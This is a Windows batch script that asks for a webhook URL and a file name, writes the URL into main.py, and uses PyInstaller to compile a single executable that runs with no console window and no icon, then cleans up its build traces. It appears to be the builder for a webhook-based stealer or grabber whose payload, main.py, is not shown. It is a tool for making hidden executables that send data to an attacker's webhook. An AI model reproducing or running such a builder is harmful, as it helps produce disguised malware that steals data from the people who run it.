@echo off
chcp 65001 > nul 2>&1
color 0a
echo.
set /p webhook="Enter the webhook URL : "
if "%webhook%"=="" (
echo.
echo No webhook URL entered.
pause
EXIT /B 1
)

echo.
echo Webhook URL is: %webhook%
echo.

set /p filename="Write down the name of the file you want : "
if "%filename%"=="" (
echo.
echo Please enter a filename.
pause
EXIT /B 1
)

echo.
echo Filename is: %filename%
echo.

echo Setting the webhook URL in main.py...
echo.

powershell -Command "(Get-Content -Encoding UTF8 'main.py') -replace 'webhookhere', '%webhook%' | Set-Content -Encoding UTF8 'main.py'"

echo.

echo Generating the executable file...
pyinstaller --clean --onefile --noconsole -i NONE -n %filename% main.py
rmdir /s /q pycache
rmdir /s /q build
del /f /s /q %filename%.spec

echo.
echo Generated exe as %filename%.exe in the dist folder.
echo.

echo Restoring the original content of main.py...
echo.

powershell -Command "(Get-Content -Encoding UTF8 'main.py') -replace '%webhook%', 'webhookhere' | Set-Content -Encoding UTF8 'main.py'"

echo.
echo File restored to its original state.

pause
EXIT /B 1